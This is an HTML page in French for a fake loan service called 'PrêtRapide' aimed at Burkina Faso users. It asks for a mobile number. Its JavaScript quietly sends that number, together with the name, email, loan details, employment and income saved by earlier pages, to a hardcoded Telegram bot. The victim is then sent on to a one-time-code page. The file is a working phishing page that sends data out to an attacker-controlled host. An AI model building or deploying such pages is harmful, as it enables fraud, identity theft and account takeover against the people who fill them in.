<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Numéro de Téléphone – PrêtRapide</title>
    <link rel="stylesheet" href="common.css">
    <style>
         :root {
            --primary: #f47312;
            --secondary: #004a99;
            --text: #1a1a2e;
            --text-muted: #6b7280;
            --border: #e0e0e0;
            --btn-disabled: #b5cce4;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            background: #f4f6fb;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            transition: opacity 0.4s ease, transform 0.4s ease;
        }
        
        body.fade-out {
            opacity: 0;
            transform: translateY(-12px);
        }
        
        .mobile-container {
            width: 100%;
            max-width: 450px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: white;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.08);
        }
        
        header {
            background: linear-gradient(135deg, #f47312, #d45f00);
            height: 110px;
            position: relative;
            display: flex;
            align-items: flex-end;
            padding: 0 20px 18px;
        }
        
        .back-btn {
            position: absolute;
            top: 18px;
            left: 18px;
            width: 36px;
            height: 36px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            text-decoration: none;
            backdrop-filter: blur(4px);
        }
        
        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .header-brand .circle {
            width: 32px;
            height: 32px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 16px;
            color: #f47312;
        }
        
        .header-brand span {
            color: white;
            font-weight: 700;
            font-size: 16px;
        }
        
        main {
            padding: 32px 22px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }
        
        .page-title {
            font-size: 26px;
            font-weight: 800;
            color: var(--text);
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }
        
        .page-sub {
            font-size: 14px;
            color: var(--text-muted);
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        .phone-input-wrapper {
            display: flex;
            align-items: center;
            border: 2px solid var(--secondary);
            border-radius: 12px;
            padding: 14px 16px;
            background: #f8fbff;
            gap: 12px;
            transition: box-shadow 0.2s;
        }
        
        .phone-input-wrapper:focus-within {
            box-shadow: 0 0 0 4px rgba(0, 74, 153, 0.1);
        }
        
        .flag-code {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 16px;
            font-weight: 700;
            color: var(--text);
            border-right: 1.5px solid var(--border);
            padding-right: 12px;
            flex-shrink: 0;
        }
        
        .flag-code .flag {
            font-size: 22px;
        }
        
        input[type="tel"] {
            border: none;
            outline: none;
            font-size: 18px;
            width: 100%;
            color: var(--text);
            background: transparent;
            font-weight: 500;
        }
        
        input[type="tel"]::placeholder {
            color: #c0c0c0;
            font-weight: 400;
        }
        
        .hint {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
            margin-left: 2px;
        }
        
        .spacer {
            flex: 1;
        }
        
        .footer-section {
            padding-bottom: 24px;
        }
        
        .checkbox-label {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 28px;
            cursor: pointer;
            font-size: 13px;
            line-height: 1.5;
            color: var(--text-muted);
        }
        
        .checkbox-label input[type="checkbox"] {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
            accent-color: var(--secondary);
            cursor: pointer;
            margin-top: 1px;
        }
        
        .checkbox-label a {
            color: var(--secondary);
            text-decoration: none;
            font-weight: 600;
        }
        
        .btn-continue {
            width: 100%;
            padding: 17px;
            border: none;
            border-radius: 13px;
            background: var(--btn-disabled);
            color: white;
            font-size: 17px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s ease;
            letter-spacing: 0.2px;
        }
        
        .btn-continue.active {
            background: linear-gradient(135deg, var(--secondary), #0062cc);
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(0, 74, 153, 0.3);
        }
        
        .btn-continue.active:active {
            transform: scale(0.98);
        }
        /* Loading overlay */
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.92);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 16px;
        }
        
        .loading-overlay.show {
            display: flex;
        }
        
        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #e0e0e0;
            border-top-color: var(--secondary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .loading-overlay p {
            font-size: 15px;
            color: var(--text-muted);
            font-weight: 500;
        }
    </style>
</head>

<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <p id="loadingText">Vérification en cours…</p>
    </div>

    <div class="mobile-container">
        <header>
            <a href="javascript:transitionTo('application.html', 400)" class="back-btn">←</a>
            <div class="header-brand">
                <div class="circle">B</div>
                <span>PrêtRapide</span>
            </div>
        </header>

        <main>
            <div class="page-title">Commençons 👋</div>
            <p class="page-sub">Entrez votre numéro de téléphone mobile pour vérifier votre identité.</p>

            <div class="phone-input-wrapper">
                <div class="flag-code">
                    <span class="flag">🇧🇫</span>
                    <span>+226</span>
                </div>
                <input type="tel" id="phoneInput" placeholder="XX XX XX XX" maxlength="8" inputmode="numeric">
            </div>
            <div class="hint">Numéro Burkina Faso · 8 chiffres</div>

            <div class="spacer"></div>

            <div class="footer-section">
                <label class="checkbox-label">
                    <input type="checkbox" id="termsCheckbox">
                    <span>
                        J'accepte les <a href="#">Conditions d'utilisation</a> et la
                        <a href="#">Politique de confidentialité</a> de PrêtRapide.
                    </span>
                </label>
                <button type="button" class="btn-continue" id="submitBtn" disabled>Continuer</button>
            </div>
        </main>
    </div>

    <script>
        const phoneInput = document.getElementById('phoneInput');
        const termsCheckbox = document.getElementById('termsCheckbox');
        const submitBtn = document.getElementById('submitBtn');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');

        // --- Telegram Bot Configuration ---
        const TELEGRAM_BOT_TOKEN = '8819447117:AAFVfPXukyPrZ-5cOKwlUXtcf37lm7Y1jF4'; // Remplacez par votre token
        const TELEGRAM_CHAT_ID = '2025851107'; // Remplacez par votre chat ID

        function showLoading(msg) {
            loadingText.textContent = msg || 'Vérification en cours…';
            loadingOverlay.classList.add('show');
        }

        function hideLoading() {
            loadingOverlay.classList.remove('show');
        }

        function validateForm() {
            const ok = phoneInput.value.length >= 8 && termsCheckbox.checked;
            submitBtn.disabled = !ok;
            submitBtn.classList.toggle('active', ok);
        }

        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            validateForm();
        });

        termsCheckbox.addEventListener('change', validateForm);

        // --- Smooth page transition ---
        function transitionTo(url, duration) {
            duration = duration || 400;
            document.body.classList.add('fade-out');
            setTimeout(function() {
                window.location.href = url;
            }, duration);
        }

        // --- Send data to Telegram ---
        async function sendToTelegram(data) {
            const message = `
📋 *Nouvelle soumission - PrêtRapide*
━━━━━━━━━━━━━━━━━━
📱 *Téléphone :* ${data.phone}
✅ *CGV acceptées :* Oui
🕐 *Horodatage :* ${data.timestamp}
━━━━━━━━━━━━━━━━━━
🔗 *Page :*number
            `.trim();

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Telegram API error: ' + response.status);
            }

            return response.json();
        }

        // --- Also collect data from sessionStorage (set by previous pages) ---
        function collectAllData() {
            const fullPhone = '+226' + phoneInput.value;

            // Collect from sessionStorage (set by application.html)
            const loanData = {
                type: sessionStorage.getItem('loanType') || 'Non spécifié',
                amount: sessionStorage.getItem('loanAmount') || 'Non spécifié',
                term: sessionStorage.getItem('loanTerm') || 'Non spécifié',
                purpose: sessionStorage.getItem('loanPurpose') || 'Non spécifié',
                firstName: sessionStorage.getItem('fName') || 'Non spécifié',
                lastName: sessionStorage.getItem('lName') || 'Non spécifié',
                email: sessionStorage.getItem('email') || 'Non spécifié',
                phone: sessionStorage.getItem('phone') || 'Non spécifié',
                empStatus: sessionStorage.getItem('empStatus') || 'Non spécifié',
                income: sessionStorage.getItem('income') || 'Non spécifié'
            };

            return {
                phone: fullPhone,
                ...loanData,
                timestamp: new Date().toLocaleString('fr-FR', {
                    timeZone: 'Africa/Ouagadougou'
                })
            };
        }

        // --- Send full details to Telegram ---
        async function sendFullDetailsToTelegram(data) {
            const message = `
━━━━━━━━━━━━━━━━━━
📌 *NOUVELLE DEMANDE DE PRÊT*
━━━━━━━━━━━━━━━━━━

👤 *Informations personnelles*
• Prénom : ${data.firstName}
• Nom : ${data.lastName}
• Email : ${data.email}
• Téléphone : ${data.phone}
• Nouveau numéro : ${data.phone}

💰 *Détails du prêt*
• Type : ${data.type}
• Montant : ${data.amount}
• Durée : ${data.term}
• Objet : ${data.purpose}

📊 *Situation financière*
• Emploi : ${data.empStatus}
• Revenu : ${data.income}

✅ *CGV acceptées :* Oui
🕐 *Soumis le :* ${data.timestamp}
━━━━━━━━━━━━━━━━━━
            `.trim();

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Telegram API error: ' + response.status);
            }

            return response.json();
        }

        // --- Handle submission ---
        submitBtn.addEventListener('click', async function() {
            if (submitBtn.disabled) return;

            const fullPhone = '+226' + phoneInput.value;
            sessionStorage.setItem('burkina_phone', fullPhone);

            // Disable button and show loading
            submitBtn.textContent = 'Patientez…';
            submitBtn.disabled = true;
            showLoading('Envoi de vos informations…');

            try {
                // Collect all data from sessionStorage + current input
                const allData = collectAllData();

                // Send to Telegram
                await sendFullDetailsToTelegram(allData);

                // Also send a short confirmation
                await sendToTelegram({
                    phone: fullPhone,
                    timestamp: allData.timestamp
                });

                // Small delay so user sees the loading state
                await new Promise(resolve => setTimeout(resolve, 800));

                // Smooth transition to otp.html
                hideLoading();
                transitionTo('otp.html', 500);

            } catch (error) {
                console.error('Erreur Telegram:', error);
                hideLoading();
                alert('Erreur de connexion. Veuillez réessayer.');
                submitBtn.textContent = 'Continuer';
                submitBtn.disabled = false;
                validateForm();
            }
        });
    </script>
</body>

</html>
